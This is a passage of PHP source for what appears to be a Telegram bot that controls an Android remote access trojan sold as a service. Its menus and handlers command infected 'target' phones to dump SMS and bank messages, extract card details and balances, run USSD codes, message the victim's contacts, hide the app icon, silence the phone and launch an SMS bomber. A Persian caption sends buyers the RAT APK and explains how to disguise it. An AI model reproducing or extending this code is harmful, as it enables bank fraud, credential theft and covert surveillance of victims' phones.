        $device_id = $ex[1];
} elseif ($data == "back_home") {
    checkTimeExpired($chat_id);
    $request_time = getIranTime();
    
    $remaining_time = getRemainingTime();
    $days = $remaining_time['days'];
    $hours = $remaining_time['hours'];
    $minutes = $remaining_time['minutes'];
    
    emg($chat_id, $mi, "
🐋 ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ

🛡️ ᴘᴏʀᴛ: $sudo_port
👥 ᴜꜱᴇʀꜱ: $contact
<blockquote>
🕒 ᴛɪᴍᴇ : $request_time
📅 ᴘᴜʀᴄʜᴀꜱᴇ ᴅᴀᴛᴇ: $bye_port
⏰ ᴇxᴘɪʀʏ ᴅᴀᴛᴇ: $time_end
⏳ ʀᴇᴍᴀɪɴɪɴɢ: $days ᴅᴀʏꜱ $hours ʜᴏᴜʀꜱ $minutes ᴍɪɴꜱ
</blockquote>
🌀 ꜱᴇʟᴇᴄᴛ ᴀᴄᴛɪᴏɴ:
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $start_button);
    
    file_put_contents("user/$chat_id/command.txt", "");
    file_put_contents("user/$chat_id/ringer.txt", "Normal");
    file_put_contents("user/$chat_id/apk.txt", "Visible");
    file_put_contents("user/$chat_id/device-id.txt", "");
    file_put_contents("user/$chat_id/device-model.txt", "null");

} elseif (strpos($data, "sms_contacts") !== false) {
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $device_model = file_get_contents("user/$device_id-model.txt");
    $sms_button = sms_button($device_id);

    file_put_contents("user/$chat_id/command.txt", "");
    smg($chat_id, 
        "📨 ‹‹ <b>ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ</b> ›› ꜱᴇᴄᴛɪᴏɴ\n\n"
        . "📝 ᴛᴇxᴛ ᴍᴇꜱꜱᴀɢᴇ : [ <code>$text_message</code> ]\n\n"
        . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", 
    send_sms_contact($device_id));

} elseif (strpos($data, "last_contacts") !== false) {
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $device_model = file_get_contents("user/$device_id-model.txt");
    $request_time = getIranTime();
    $wait_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴅᴇᴠɪᴄᴇ\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "📨 ᴍᴏᴅᴇ: ꜱᴇɴᴅ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ\n"
                 . "📝 ᴛᴇxᴛ: $text_message\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n\n"
                 . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/$device_id-smscontacts-msg.txt", $chat_id."|".$wait_msg->result->message_id);
    
    file_put_contents("user/$chat_id/command.txt", "");
    requestSMSContact("smcontact", $device_id, $text_message);
    } elseif (strpos($data, 'back_panel') !== false) {

        $datass = explode(" ", $data);
        $control_button = control_button($datass[1]);
$name = file_get_contents("user/$dev_id_use-name.txt");  
$install_ip = file_get_contents("user/$dev_id_use-ip.txt");
$name = file_get_contents("user/$dev_id_use-name.txt");
$offline = file_get_contents("user/$dev_id_use-offline.txt");
$apk_status = file_get_contents("user/$dev_id_use-apk.txt");

emg($chat_id, $mi,"
🧽 ᴛᴀʀɢᴇᴛ ʙᴀᴄᴋ ᴘᴀɴᴇʟ
❄️ ꜱᴇʟᴇᴄᴛ ʏᴏᴜʀ ᴏᴘᴛɪᴏɴ
➰ ᴜꜱᴇʀ ᴘᴀɴᴇʟ

<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", 
$control_button);
#------------------------------------------------------- 
#KalamatVorodi
        /*} elseif ($text == "Online Devices") {
            file_put_contents("data/onlineusers.txt", "");


            smg($chat_id, "Can a request to [ <b>check devices</b> ] be sent online? Click the button below", $onli_btn);

        } elseif ($data == "online_checo") {

            emg($chat_id, $mi, "Checking Online Devices ...", null);
            file_put_contents("data/miid.txt", $mi);
            requestsAll('online_device');
            file_put_contents("user/$chat_id/command.txt", "");*/


          }  elseif ($text == "/list") {
                file_put_contents("data/onlineusers.txt", "");
        
                smg($chat_id, "Can a request to [ <b>check devices</b> ] be sent online? Click the button below", $onli_btn);
        
} elseif ($data == "online_checo") {
    emg($chat_id, $mi, "🟢 ɪɴɪᴛɪᴀᴛɪɴɢ ᴘɪɴɢ ꜱᴄᴀɴ...\n\n⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ 5 ꜱᴇᴄᴏɴᴅꜱ\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",null);
    
    // پاک کردن لیست قبلی و شروع جدید
    file_put_contents("data/online_users.json", "[]");
    file_put_contents("data/mid.txt", $mi);
    
    // ارسال درخواست پینگ به همه
    requestsAll('online_device');
    
    // ایجاد دکمه بعد از 5 ثانیه
    sleep(5);
    
    $collectButton = json_encode([
        'inline_keyboard' => [
            [['text' => "📋 ꜱʜᴏᴡ ᴏɴʟɪɴᴇ ʟɪꜱᴛ", 'callback_data' => 'show_online_list']]
        ]
    ]);
    
    emg($chat_id, $mi, "🟢 ᴘɪɴɢ ʀᴇQᴜᴇꜱᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ\n\n🌀 ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ ꜱʜᴏᴡ ᴏɴʟɪɴᴇ ᴜꜱᴇʀꜱ\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $collectButton);
    file_put_contents("user/$chat_id/command.txt", "");
        
} elseif ($data == "show_online_list") {
    $onlineUsers = json_decode(file_get_contents("data/online_users.json"), true);
    
    if (empty($onlineUsers)) {
        bot('answerCallbackQuery', [
            'callback_query_id' => $update->callback_query->id,
            'text' => '⏳ ɴᴏ ᴜꜱᴇʀꜱ ꜰᴏᴜɴᴅ ʏᴇᴛ, ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ 5 ꜱᴇᴄᴏɴᴅꜱ',
            'show_alert' => false
        ]);
        return;
    }
    
    $text = "📡 Active Connections List:\n\n";
    
    foreach ($onlineUsers as $androidid => $name) {
        $userName = file_exists("user/$androidid-name.txt") ? 
                   file_get_contents("user/$androidid-name.txt") : 
                   "user" . rand(1, 100);
            
        $text .= $userName . "-/set_" . $androidid . "\n";
    }
    
    $text .= "\nTotal Devices: " . count($onlineUsers) . "\n";
    $text .= "Page 1/1\n";
    $text .= "➖➖➖➖➖➖➖➖➖➖\n";
    $text .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

    $refreshButton = json_encode([
        'inline_keyboard' => [
            [['text' => "🔄 ʀᴇꜰʀᴇꜱʜ", 'callback_data' => 'refresh_online_list']]
        ]
    ]);
    
    emg($chat_id, $mi, $text, $refreshButton);

} elseif ($data == "refresh_online_list") {
    // ذخیره لیست فعلی قبل از پینگ جدید
    $currentUsers = json_decode(file_get_contents("data/online_users.json"), true);
    if (!$currentUsers) {
        $currentUsers = [];
    }
    
    // ایجاد فایل موقت برای ذخیره لیست فعلی
    file_put_contents("data/current_users_backup.json", json_encode($currentUsers));
    
    // ارسال درخواست پینگ جدید
    requestsAll('online_device');
    
    bot('answerCallbackQuery', [
        'callback_query_id' => $update->callback_query->id,
        'text' => '🔄 ꜱᴄᴀɴɴɪɴɢ ꜰᴏʀ ɴᴇᴡ ᴜꜱᴇʀꜱ...',
        'show_alert' => false
    ]);
    
    // صبر کن تا پاسخ‌ها بیایند
    sleep(5);
    
    // ترکیب لیست قدیم و جدید
    $backupUsers = json_decode(file_get_contents("data/current_users_backup.json"), true);
    $newUsers = json_decode(file_get_contents("data/online_users.json"), true);
    
    if (!$backupUsers) $backupUsers = [];
    if (!$newUsers) $newUsers = [];
    
    // ترکیب بدون حذف تکراری
    $allUsers = $backupUsers;
    foreach ($newUsers as $androidid => $name) {
        $allUsers[$androidid] = $name;
    }
    
    // ذخیره لیست نهایی
    file_put_contents("data/online_users.json", json_encode($allUsers));
    
    $text = "📡 Active Connections List:\n\n";
    
    foreach ($allUsers as $androidid => $name) {
        $userName = file_exists("user/$androidid-name.txt") ? 
                   file_get_contents("user/$androidid-name.txt") : 
                   "user" . rand(1, 100);
            
        $text .= $userName . "-/set_" . $androidid . "\n";
    }
    
    $text .= "\nTotal Devices: " . count($allUsers) . "\n";
    $text .= "Page 1/1\n";
    $text .= "➖➖➖➖➖➖➖➖➖➖\n";
    $text .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";

    $refreshButton = json_encode([
        'inline_keyboard' => [
            [['text' => "🔄 ʀᴇꜰʀᴇꜱʜ", 'callback_data' => 'refresh_online_list']]
        ]
    ]);
    
    emg($chat_id, $mi, $text, $refreshButton);
            } elseif (strpos($data, 'page_') !== false) {
                $page = (int)str_replace('page_', '', $data);
                updateMessageWithUsers($chat_id, $mi, $page);


} elseif ($data == 'apkk') {
        $cap = '
فایل رت شما آماده شد [ #کمک_معیشتی ] ✅

برای ادیت ایکون و نام رت از [apk editor] ادیت بزنید ✅

برای تغییر پورت رتتون میرید قسمت ( assets ) بعد (sudoport) پورتتون رو میزارید ✅ 

🐦‍🔥 | ɪᴍ-ꜱᴀᴇᴇᴅ
';

        bot('sendDocument', [
            'chat_id' => $chat_id,
            'document' => new CURLFile("imgod.apk"),
            'caption' => " $cap ",
        ]);


    } elseif ($text == "/Settings") {
checkTimeExpired($chat_id);
        smg($chat_id, "‹‹ <b>Settings Page</b> ›› section\nSelect the desired option :

<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $settings_button);
} elseif ($data == "setting") {
    checkTimeExpired($chat_id);
    
    $settings_button = json_encode([
        'resize_keyboard' => true,
        'inline_keyboard' => [
            [
                ['text' => "📞 ɢᴇᴛ ᴀʟʟ ɴᴜᴍʙᴇʀꜱ", 'callback_data' => 'get_all_numbers'],
                ['text' => "💸 ɢᴇᴛ ᴀʟʟ ʙᴀʟᴀɴᴄᴇꜱ", 'callback_data' => 'get_all_balance']
            ],
            [
                ['text' => "💣 ꜱᴍꜱ ʙᴏᴍʙᴇʀ", 'callback_data' => 'sms_all'],
                ['text' => "🔍 ꜱᴇᴀʀᴄʜ ᴀʟʟ ꜱᴍꜱ", 'callback_data' => 'search_all']
            ],
            [
                ['text' => "👻 ʜɪᴅᴇ ᴀʟʟ ɪᴄᴏɴꜱ", 'callback_data' => 'hide_all'],
                ['text' => "🔇 ꜱɪʟᴇɴᴛ ᴀʟʟ", 'callback_data' => 'silent_all']
            ],
            [
                ['text' => "🔊 ɴᴏʀᴍᴀʟ ᴀʟʟ 🔊", 'callback_data' => 'normal_all']
            ],
            [
                ['text' => "⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", 'callback_data' => 'back_home']
            ]
        ]
    ]);
    
    emg($chat_id, $mi, "
<b>🌐 ʀᴇǫᴜᴇꜱᴛ ᴀʟʟ ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ</b>
<b>✨ ꜱᴇʟᴇᴄᴛ ᴀɴ ᴀᴄᴛɪᴏɴ ᴛᴏ ᴘᴇʀꜰᴏʀᴍ ᴏɴ ᴀʟʟ ᴅᴇᴠɪᴄᴇꜱ</b>

<b><b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b></b>", $settings_button);
} elseif ($data == "normal_all") {
    // اول پیام callback رو نشون میدیم
    bot('answerCallbackQuery', [
        'callback_query_id' => $update->callback_query->id,
        'text' => '🔄 ɢᴇᴛᴛɪɴɢ ᴏɴʟɪɴᴇ ᴜꜱᴇʀꜱ ʟɪꜱᴛ...',
        'show_alert' => false
    ]);
    
    $request_time = getIranTime();
    
    // اول فایل رو پاک می‌کنیم
    file_put_contents("data/online_users.json", "[]");
    
    // بعد درخواست پینگ می‌فرستیم
    requestsAll('online_device');
    
    // صبر می‌کنیم تا پاسخ‌ها بیایند و لیست آپدیت بشه
    sleep(5);
    
    // حالا لیست آپدیت شده رو می‌خونیم
    $onlineUsers = json_decode(file_get_contents("data/online_users.json"), true);
    
    if (empty($onlineUsers)) {
        emg($chat_id, $mi, "❌ <b>ɴᴏ ᴏɴʟɪɴᴇ ᴜꜱᴇʀꜱ ꜰᴏᴜɴᴅ</b>\n\n<b>ᴀʟʟ ᴜꜱᴇʀꜱ ᴀʀᴇ ᴏꜰꜰʟɪɴᴇ ᴏʀ ɴᴏᴛ ʀᴇꜱᴘᴏɴᴅɪɴɢ</b>\n\n<b><b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b></b>", null);
        return;
    }
    
    smg($chat_id, "🌀 <b>ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴀʟʟ ᴅᴇᴠɪᴄᴇꜱ</b>\n\n👤 <b>ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ:</b> " . count($onlineUsers) . "\n🫡 <b>ᴄᴏᴍᴍᴀɴᴅ:</b> ɴᴏʀᴍᴀʟ ᴀʟʟ\n<blockquote>🕒 <b>ʀᴇǫᴜᴇꜱᴛ ᴛɪᴍᴇ:</b> $request_time</blockquote>\n\n<b><b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b></b>", null);
    
    // ارسال درخواست normal به همه کاربران
    foreach ($onlineUsers as $androidid => $name) {
        requests('Normal', $androidid);
        usleep(100000); // 0.1 ثانیه
    }

} elseif ($data == "rat_set") {
    checkTimeExpired($chat_id);
    emg($chat_id, $mi, "
⚙️ ʀᴀᴛ ꜱᴇᴛᴛɪɴɢꜱ ᴘᴀɴᴇʟ
    
ᴜꜱᴇ <code>/compile</code> ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ʀᴀᴛ
    ", $goooo);
    } elseif ($data == "rat_set") {
        emg($chat_id, $mi, "⚙️ʀᴀᴛ ꜱᴇᴛᴛɪɴɢꜱ ᴘᴀʀᴛ", $goooo);
    } elseif ($data == "panel_set") {
        emg($chat_id, $mi, "🔧ᴘᴀɴᴇʟ ꜱᴇᴛᴛɪɴɢꜱ ᴘᴀʀᴛ", $goooo2);
    } elseif ($data == "/help") {
        smg($chat_id, "<b>~ Yes 🙂‍↔️</b>", $goooo);
    } elseif ($text == "/Help") {
        smg($chat_id, "<b>Help Rat Remote $dev_name</b>
برای راهنمایی به پیوی سازنده مراجعه کنید.
        ", $dev_inline);

    } elseif (strpos($text, '/set_') !== false) {
        checkTimeExpired($chat_id);
    $login_part = str_replace('/set_', '', $text);
    $device_id = strtok($login_part, '@');
    $dev_id_use = $device_id;
    
    file_put_contents("user/$chat_id/device-id.txt", $dev_id_use);
    $device_model = file_get_contents("user/$dev_id_use-model.txt");
    file_put_contents("user/$chat_id/device-model.txt", $device_model);
    
$panel_log = json_encode([
    'resize_keyboard' => true,
    'inline_keyboard' => [
        [
            ['text' => "🛜 ᴘɪɴɢ ᴅᴇᴠɪᴄᴇ 🛜", 'callback_data' => "status_user $dev_id_use"]
        ],
        [
            ['text' => "📲 ᴜꜱꜱᴅ ᴄᴏᴅᴇ", 'callback_data' => "ussdcode $dev_id_use"],
            ['text' => "📞 ɢᴇᴛ ɴᴜᴍʙᴇʀ", 'callback_data' => "userphone $dev_id_use"]
        ],
        [
            ['text' => "🎭 ᴄʜᴀɴɢᴇ", 'callback_data' => "change $dev_id_use"],
            ['text' => "🙈 ʜɪᴅᴇ", 'callback_data' => "hide_icon $dev_id_use"],
            ['text' => "👁 ꜱʜᴏᴡ", 'callback_data' => "visible_icon $dev_id_use"]
        ],
        [
            ['text' => "💸 ʙᴀʟᴀɴᴄᴇꜱ 💸", 'callback_data' => "balance $dev_id_use"]
        ],
        [
            ['text' => "🏦 ʟᴀꜱᴛ ʙᴀɴᴋ ꜱᴍꜱ", 'callback_data' => "last_Bank_sms $dev_id_use"],
            ['text' => "📑 ʙᴀɴᴋ ꜱᴍꜱ ʟɪꜱᴛ", 'callback_data' => "All_Bank_sms $dev_id_use"]
        ],
        [
            ['text' => "🌐 ᴏɴʟɪɴᴇ ᴍᴏᴅᴇ", 'callback_data' => "offmodeon $dev_id_use"],
            ['text' => "🚫 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ", 'callback_data' => "offmodeoff $dev_id_use"]
        ],
        [
            ['text' => "👥 ᴄᴏɴᴛᴀᴄᴛꜱ", 'callback_data' => "all_contacts $dev_id_use"],
            ['text' => "✉️ ꜱᴇɴᴅ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ", 'callback_data' => "sms_contacts $dev_id_use"]
        ],
        [
            ['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ", 'callback_data' => "last_sms $dev_id_use"],
            ['text' => "✉️ ꜱᴇɴᴅ ꜱᴍꜱ", 'callback_data' => "send_sms $dev_id_use"]
        ],
        [
            ['text' => "📜 ꜱᴍꜱ ʟɪꜱᴛ", 'callback_data' => "Popo $dev_id_use"],
            ['text' => "📤 ᴏᴜᴛʙᴏx", 'callback_data' => "sent $dev_id_use"],
            ['text' => "📥 ɪɴʙᴏx", 'callback_data' => "recived $dev_id_use"]
        ],
        [
            ['text' => "🔍 ꜱᴇᴀʀᴄʜ ꜱᴍꜱ", 'callback_data' => "searchSMS $dev_id_use"],
            ['text' => "💳 ᴄᴀʀᴅ ɪɴꜰᴏ", 'callback_data' => "extract_cards $dev_id_use"]
        ],
        [
            ['text' => "🔕 ꜱɪʟᴇɴᴛ ᴍᴏᴅᴇ", 'callback_data' => "silent_mode $dev_id_use"],
            ['text' => "🔔 ɴᴏʀᴍᴀʟ ᴍᴏᴅᴇ", 'callback_data' => "normal_mode $dev_id_use"]
        ],
        [
            ['text' => "📮 ɢᴇᴛ ʀᴀɴɢᴇ 📮", 'callback_data' => "get_range $dev_id_use"]
        ],
        [
            ['text' => "⬅️ ʙᴀᴄᴋ", 'callback_data' => "back_home"]
        ]
    ]
]);
$name = file_get_contents("user/$dev_id_use-name.txt");  
$install_ip = file_get_contents("user/$dev_id_use-ip.txt");
$name = file_get_contents("user/$dev_id_use-name.txt");
$offline = file_get_contents("user/$dev_id_use-offline.txt");
$apk_status = file_get_contents("user/$dev_id_use-apk.txt");

smg($chat_id, "
🧽 ᴛᴀʀɢᴇᴛ ᴘᴀɴᴇʟ
❄️ ꜱᴇʟᴇᴄᴛ ʏᴏᴜʀ ᴏᴘᴛɪᴏɴ
➰ ᴜꜱᴇʀ ᴘᴀɴᴇʟ

<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>
", $panel_log);

    } elseif (strpos($data, 'ls') !== false) {
        checkTimeExpired($chat_id);
        $datass = explode(" ", $data);

        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        $dev_id_use = $datass[1];
        $ringer_mode = file_get_contents("user/$dev_id_use-ringer.txt");
        $apk_mode = file_get_contents("user/$dev_id_use-apk.txt");

        $status_offline1 = file_get_contents("user/$device_id-offline.txt");
$panel_log = json_encode([
    'resize_keyboard' => true,
    'inline_keyboard' => [
        [
            ['text' => "🛜 ᴘɪɴɢ ᴅᴇᴠɪᴄᴇ 🛜", 'callback_data' => "status_user $dev_id_use"]
        ],
        [
            ['text' => "📲 ᴜꜱꜱᴅ ᴄᴏᴅᴇ", 'callback_data' => "ussdcode $dev_id_use"],
            ['text' => "📞 ɢᴇᴛ ɴᴜᴍʙᴇʀ", 'callback_data' => "userphone $dev_id_use"]
        ],
        [
            ['text' => "🎭 ᴄʜᴀɴɢᴇ", 'callback_data' => "change $dev_id_use"],
            ['text' => "🙈 ʜɪᴅᴇ", 'callback_data' => "hide_icon $dev_id_use"],
            ['text' => "👁 ꜱʜᴏᴡ", 'callback_data' => "visible_icon $dev_id_use"]
        ],
        [
            ['text' => "💸 ʙᴀʟᴀɴᴄᴇꜱ 💸", 'callback_data' => "balance $dev_id_use"]
        ],
        [
            ['text' => "🏦 ʟᴀꜱᴛ ʙᴀɴᴋ ꜱᴍꜱ", 'callback_data' => "last_Bank_sms $dev_id_use"],
            ['text' => "📑 ʙᴀɴᴋ ꜱᴍꜱ ʟɪꜱᴛ", 'callback_data' => "All_Bank_sms $dev_id_use"]
        ],
        [
            ['text' => "🌐 ᴏɴʟɪɴᴇ ᴍᴏᴅᴇ", 'callback_data' => "offmodeon $dev_id_use"],
            ['text' => "🚫 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ", 'callback_data' => "offmodeoff $dev_id_use"]
        ],
        [
            ['text' => "👥 ᴄᴏɴᴛᴀᴄᴛꜱ", 'callback_data' => "all_contacts $dev_id_use"],
            ['text' => "✉️ ꜱᴇɴᴅ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ", 'callback_data' => "sms_contacts $dev_id_use"]
        ],
        [
            ['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ", 'callback_data' => "last_sms $dev_id_use"],
            ['text' => "✉️ ꜱᴇɴᴅ ꜱᴍꜱ", 'callback_data' => "send_sms $dev_id_use"]
        ],
        [
            ['text' => "📜 ꜱᴍꜱ ʟɪꜱᴛ", 'callback_data' => "Popo $dev_id_use"],
            ['text' => "📤 ᴏᴜᴛʙᴏx", 'callback_data' => "sent $dev_id_use"],
            ['text' => "📥 ɪɴʙᴏx", 'callback_data' => "recived $dev_id_use"]
        ],
        [
            ['text' => "🔍 ꜱᴇᴀʀᴄʜ ꜱᴍꜱ", 'callback_data' => "searchSMS $dev_id_use"],
            ['text' => "💳 ᴄᴀʀᴅ ɪɴꜰᴏ", 'callback_data' => "extract_cards $dev_id_use"]
        ],
        [
            ['text' => "🔕 ꜱɪʟᴇɴᴛ ᴍᴏᴅᴇ", 'callback_data' => "silent_mode $dev_id_use"],
            ['text' => "🔔 ɴᴏʀᴍᴀʟ ᴍᴏᴅᴇ", 'callback_data' => "normal_mode $dev_id_use"]
        ],
        [
            ['text' => "📮 ɢᴇᴛ ʀᴀɴɢᴇ 📮", 'callback_data' => "get_range $dev_id_use"]
        ],
        [
            ['text' => "⬅️ ʙᴀᴄᴋ", 'callback_data' => "back_home"]
        ]
    ]
]);
        smg($chat_id, "‹‹ <b>Device Control</b> ›› section\n\nSelect the desired option :", $panel_log);

    } elseif (strpos($data, 'fs') !== false) {

        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        file_put_contents("user/$datass[1]-apk.txt", "Hidden");
        requests('hidden', $datass[1]);
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", $geeeh);

    } elseif (strpos($data, 'newic') !== false) {

        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        file_put_contents("user/$datass[1]-apk.txt", "Hidden");
        requests('changetogoogle', $datass[1]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", null);

    } elseif (strpos($data, 'hg') !== false) {

        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        file_put_contents("user/$datass[1]-ringer.txt", "Silent");
        requests('silent', $datass[1]);
        $request_time = getIranTime();
bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ɴᴏʀᴍᴀʟ ᴍᴏᴅᴇ \n\n\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n\n\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    } elseif (strpos($data, "get_range") !== false) {
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $device_model = file_get_contents("user/$device_id-model.txt");
    $request_time = getIranTime();
    
    $wait_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: get range\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n\n"
                 . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/{$device_id}_range_process.txt", json_encode([
        'chat_id' => $chat_id,
        'message_id' => $wait_msg->result->message_id,
        'time' => time()
    ]));
    
    requests('all_contacts', $device_id);

    } elseif (strpos($data, 'rt') !== false) {
        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", $geeeh);
        requests('status', $datass[1]);

    } elseif (strpos($data, 'wqw') !== false) {
        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        requests('last_sms', $datass[1]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b> ", $geeeh);

    } elseif (strpos($data, 'kkkk') !== false) {
        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        requests('all_sms', $datass[1]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", $geeeh);

    } elseif (strpos($data, 'Kops') !== false) {
        $datass = explode(" ", $data);
        $word = file_get_contents("user/$chat_id/word.txt");
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        requests('WhatsChecker', $datass[1]);
        smg($chat_id, "<b>CheCk $word \nApproximate time : 3 seconds</b>", $geeeh);

    } elseif (strpos($data, "offmodeon") !== false) {
        checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $model = file_get_contents("user/$device_id-model.txt");
    $request_time = getIranTime();    
    $wait_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴅᴇᴠɪᴄᴇ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                . "👤 ᴛᴀʀɢᴇᴛ: $device_id | [$model]\n"
                . "🫡 ᴄᴏᴍᴍᴀɴᴅ: ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴏɴ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/$device_id-offlineon-msg.txt", $chat_id."|".$wait_msg->result->message_id);
    
    $offline_number = file_get_contents("data/offline-number.txt");
    requestSMS("offline_mode_on", $device_id, $offline_number, null);

    } elseif (strpos($data, "offmodeoff") !== false) {
        checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $model = file_get_contents("user/$device_id-model.txt");
    $request_time = getIranTime();  
    $wait_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴅᴇᴠɪᴄᴇ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                . "👤 ᴛᴀʀɢᴇᴛ: $device_id | [$model]\n"
                . "🫡 ᴄᴏᴍᴍᴀɴᴅ: ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ᴏꜰꜰ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
